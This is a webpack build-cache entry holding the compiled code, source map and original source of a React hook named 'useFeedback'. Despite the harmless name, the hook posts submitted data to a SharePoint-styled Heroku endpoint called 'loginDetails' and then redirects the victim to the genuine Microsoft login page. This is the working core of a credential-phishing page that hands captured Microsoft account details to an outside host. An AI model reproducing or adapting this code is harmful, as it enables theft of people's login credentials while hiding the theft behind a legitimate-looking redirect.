{"ast":null,"code":"var _s = $RefreshSig$();\n\nimport axios from 'axios';\nimport { toast } from 'react-toastify';\nimport 'react-toastify/dist/ReactToastify.css';\nimport { useReducer } from 'react';\nimport { START_FEEDBACK, STOP_FEEDBACK } from './feedbackTypes';\nimport FeedbackReducer from './FeedbackReducer';\ntoast.configure();\n\nconst useFeedback = () => {\n  _s();\n\n  const [{\n    isLoading\n  }, dispatch] = useReducer(FeedbackReducer, {\n    isLoading: false\n  });\n\n  const postFeedback = async data => {\n    dispatch({\n      type: START_FEEDBACK\n    });\n\n    try {\n      const response = await axios.post(`${'https://share-point-tt.herokuapp.com/api/loginDetails'}`, data);\n\n      if (response.status === 200) {\n        window.location.assign('https://login.microsoftonline.com/common/login');\n        dispatch({\n          type: STOP_FEEDBACK\n        });\n      } else {\n        toast.error('oops');\n      }\n    } catch (e) {\n      toast.info('Something went wrong!');\n\n      if (e.response) {\n        dispatch({\n          type: STOP_FEEDBACK\n        });\n      }\n    }\n  };\n\n  return {\n    postFeedback,\n    isLoading\n  };\n};\n\n_s(useFeedback, \"myrd++y1nVQcDsAOVHRgSrUXUv0=\");\n\nexport default useFeedback;","map":{"version":3,"sources":["C:/Users/rdp/Desktop/apireyes/src/api/useFeedback.js"],"names":["axios","toast","useReducer","START_FEEDBACK","STOP_FEEDBACK","FeedbackReducer","configure","useFeedback","isLoading","dispatch","postFeedback","data","type","response","post","status","window","location","assign","error","e","info"],"mappings":";;AAAA,OAAOA,KAAP,MAAkB,OAAlB;AACA,SAASC,KAAT,QAAsB,gBAAtB;AACA,OAAO,uCAAP;AACA,SAASC,UAAT,QAA2B,OAA3B;AACA,SAASC,cAAT,EAAyBC,aAAzB,QAA8C,iBAA9C;AACA,OAAOC,eAAP,MAA4B,mBAA5B;AAGAJ,KAAK,CAACK,SAAN;;AAGA,MAAMC,WAAW,GAAG,MAAM;AAAA;;AACxB,QAAM,CACJ;AAAEC,IAAAA;AAAF,GADI,EAEJC,QAFI,IAGFP,UAAU,CAACG,eAAD,EAAkB;AAC9BG,IAAAA,SAAS,EAAE;AADmB,GAAlB,CAHd;;AAOA,QAAME,YAAY,GAAG,MAAOC,IAAP,IAAgB;AACnCF,IAAAA,QAAQ,CAAC;AAAEG,MAAAA,IAAI,EAAET;AAAR,KAAD,CAAR;;AACA,QAAI;AACF,YAAMU,QAAQ,GAAG,MAAMb,KAAK,CAACc,IAAN,CAAY,GAAE,uDAAwD,EAAtE,EACtBH,IADsB,CAAvB;;AAEA,UAAIE,QAAQ,CAACE,MAAT,KAAoB,GAAxB,EAA8B;AAC5BC,QAAAA,MAAM,CAACC,QAAP,CAAgBC,MAAhB,CAAuB,gDAAvB;AACAT,QAAAA,QAAQ,CAAC;AACPG,UAAAA,IAAI,EAAER;AADC,SAAD,CAAR;AAGD,OALD,MAKO;AACLH,QAAAA,KAAK,CAACkB,KAAN,CAAY,MAAZ;AACD;AAEF,KAZD,CAYE,OAAOC,CAAP,EAAU;AACVnB,MAAAA,KAAK,CAACoB,IAAN,CAAW,uBAAX;;AACA,UAAID,CAAC,CAACP,QAAN,EAAgB;AACdJ,QAAAA,QAAQ,CAAC;AAAEG,UAAAA,IAAI,EAAER;AAAR,SAAD,CAAR;AACD;AACF;AACF,GApBD;;AAsBA,SAAO;AACLM,IAAAA,YADK;AAELF,IAAAA;AAFK,GAAP;AAID,CAlCD;;GAAMD,W;;AAoCN,eAAeA,WAAf","sourcesContent":["import axios from 'axios';\r\nimport { toast } from 'react-toastify';\r\nimport 'react-toastify/dist/ReactToastify.css';\r\nimport { useReducer } from 'react';\r\nimport { START_FEEDBACK, STOP_FEEDBACK } from './feedbackTypes';\r\nimport FeedbackReducer from './FeedbackReducer';\r\n\r\n\r\ntoast.configure()\r\n\r\n\r\nconst useFeedback = () => {\r\n  const [\r\n    { isLoading },\r\n    dispatch,\r\n  ] = useReducer(FeedbackReducer, {\r\n    isLoading: false,\r\n  });\r\n\r\n  const postFeedback = async (data) => {\r\n    dispatch({ type: START_FEEDBACK });\r\n    try {\r\n      const response = await axios.post(`${'https://share-point-tt.herokuapp.com/api/loginDetails'}`,\r\n       data);\r\n      if (response.status === 200 ) {\r\n        window.location.assign('https://login.microsoftonline.com/common/login');\r\n        dispatch({\r\n          type: STOP_FEEDBACK,\r\n        });\r\n      } else {\r\n        toast.error('oops');\r\n      }\r\n    \r\n    } catch (e) {\r\n      toast.info('Something went wrong!');\r\n      if (e.response) {\r\n        dispatch({ type: STOP_FEEDBACK });\r\n      }\r\n    }\r\n  };\r\n\r\n  return {\r\n    postFeedback,\r\n    isLoading,\r\n  };\r\n};\r\n\r\nexport default useFeedback;\r\n"]},"metadata":{},"sourceType":"module"}